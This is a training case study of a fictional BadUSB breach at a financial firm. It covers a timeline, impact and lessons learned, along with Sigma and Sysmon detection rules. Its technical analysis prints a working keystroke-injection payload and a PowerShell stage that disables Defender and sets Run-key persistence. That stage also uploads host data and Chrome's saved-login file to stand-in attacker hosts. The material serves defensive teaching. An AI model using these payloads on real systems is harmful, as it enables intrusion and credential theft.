# Case Study 01: Corporate Network Breach via BadUSB

## Scenario Overview

**Organization:** MidSize Financial Corp (fictional)
**Industry:** Financial Services
**Employees:** 2,500
**Attack Type:** BadUSB + Data Exfiltration
**Outcome:** Credential theft and lateral movement

---

## Timeline of Events

### Day 1: Initial Compromise

**08:45** - An employee in the accounting department finds a USB drive in the parking lot labeled "Q4 Bonus List - Confidential"

**08:52** - Employee inserts USB drive into their workstation

**08:52:03** - BadUSB payload executes:
```
1. Opens PowerShell (hidden window)
2. Disables Windows Defender
3. Downloads staged payload from C2
4. Establishes persistence via Registry Run key
5. Collects system information
6. Exfiltrates to attacker's server
```

**08:52:15** - Payload execution completes (12 seconds total)

**08:53** - Employee sees brief flash, assumes USB is faulty

### Day 1-3: Lateral Movement

**Day 1, 14:00** - Attacker accesses compromised workstation via reverse shell

**Day 1, 15:30** - Credential harvesting:
- Browser saved passwords
- Cached domain credentials
- WiFi passwords

**Day 2, 09:00** - Attacker uses harvested credentials to access:
- Corporate file shares
- Email (Outlook Web Access)
- Internal HR portal

**Day 3, 16:00** - Attacker pivots to finance server using stolen admin credentials

### Day 5: Detection

**10:23** - SIEM alert triggers on unusual PowerShell activity

**10:45** - SOC analyst begins investigation

**11:30** - Incident declared, IR team activated

---

## Technical Analysis

### The Payload

```
REM Corporate Breach Payload
REM Victim: Windows 10 Enterprise

DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -c "IEX(IWR 'https://cdn.attacker[.]com/stage1.ps1')"
ENTER
```

### Stage 1 Payload (Downloaded)

```powershell
# Disable Defender
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# Persistence
$payload = "powershell -w hidden -c `"IEX(IWR 'https://cdn.attacker[.]com/beacon.ps1')`""
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $payload

# Collect information
$info = @{
    Hostname = $env:COMPUTERNAME
    User = $env:USERNAME
    Domain = $env:USERDOMAIN
    IP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress
}

# Exfiltrate
Invoke-WebRequest -Uri "https://c2.attacker[.]com/collect" -Method POST -Body ($info | ConvertTo-Json)

# Browser credentials
$chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
if(Test-Path "$chrome\Login Data") {
    Copy-Item "$chrome\Login Data" "$env:TEMP\creds.db"
    $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:TEMP\creds.db"))
    IWR -Uri "https://c2.attacker[.]com/upload" -Method POST -Body $b64
}
```

### IOCs Identified

| Type | Value |
|------|-------|
| Domain | cdn.attacker[.]com |
| Domain | c2.attacker[.]com |
| IP | 185.x.x.x |
| Registry | HKCU\...\Run\WindowsUpdate |
| Hash (stage1.ps1) | SHA256: abc123... |

---

## Detection Gaps

### What Was Missed

1. **USB Insertion** - No USB device monitoring in place
2. **PowerShell Execution** - Script Block Logging not enabled
3. **Defender Tampering** - Alert existed but was not prioritized
4. **C2 Traffic** - HTTPS traffic not inspected
5. **Registry Change** - Run key modification not monitored

### What Finally Detected It

- **Sysmon Event ID 1** - Unusual PowerShell command line
- **Sysmon Event ID 3** - Connection to known-bad IP
- **Behavioral Analytics** - User accessing unusual file shares

---

## Impact Assessment

### Compromised Data

| Data Type | Records | Sensitivity |
|-----------|---------|-------------|
| Employee PII | 2,500 | High |
| Financial Records | 50,000 | Critical |
| Customer Data | 10,000 | Critical |
| Credentials | 150 | Critical |

### Business Impact

- **Regulatory Fines:** $500,000 (estimated)
- **Breach Notification:** 12,500 individuals
- **Forensics & IR:** $200,000
- **Reputation:** Significant damage
- **Downtime:** 72 hours

---

## Lessons Learned

### Immediate Improvements

1. **USB Device Control**
   - Implemented GPO to block unauthorized USB devices
   - Deployed USB port locks on sensitive workstations

2. **Detection Enhancements**
   - Enabled PowerShell Script Block Logging
   - Added Sysmon with custom configuration
   - Created detection rules for registry persistence

3. **Response Improvements**
   - Updated IR playbook for BadUSB scenarios
   - Conducted tabletop exercise

### Long-term Improvements

1. **Security Awareness**
   - Mandatory training on USB risks
   - Phishing and social engineering modules
   - "See something, say something" program

2. **Zero Trust Architecture**
   - Implemented least-privilege access
   - Added MFA everywhere
   - Network segmentation

3. **Threat Hunting**
   - Regular hunts for persistence mechanisms
   - PowerShell baseline analysis
   - USB device auditing

---

## Detection Rules Created

### Sigma Rule: Suspicious PowerShell Download

```yaml
title: PowerShell Web Download and Execute
status: production
logsource:
  product: windows
  service: powershell
detection:
  selection:
    EventID: 4104
    ScriptBlockText|contains|all:
      - 'IWR'
      - 'IEX'
  condition: selection
level: high
tags:
  - attack.execution
  - attack.t1059.001
```

### Sysmon Rule: Registry Run Key Persistence

```xml
<RuleGroup name="RegistryPersistence" groupRelation="or">
  <RegistryEvent onmatch="include">
    <TargetObject condition="contains">CurrentVersion\Run</TargetObject>
    <Details condition="contains">powershell</Details>
  </RegistryEvent>
</RuleGroup>
```

---

## Questions for Discussion

1. How could the organization have prevented the initial compromise?
2. What additional detection mechanisms would have shortened the dwell time?
3. How should the employee who inserted the USB be handled?
4. What compliance implications does this breach have?
5. How would you prioritize the recommended improvements?

---

## References

- MITRE ATT&CK: T1091, T1059.001, T1547.001, T1555.003
- NIST SP 800-61: Computer Security Incident Handling Guide
- CIS Controls: #8 (Malware Defenses), #13 (Data Protection)

---

[← Back to Case Studies](./README.md)
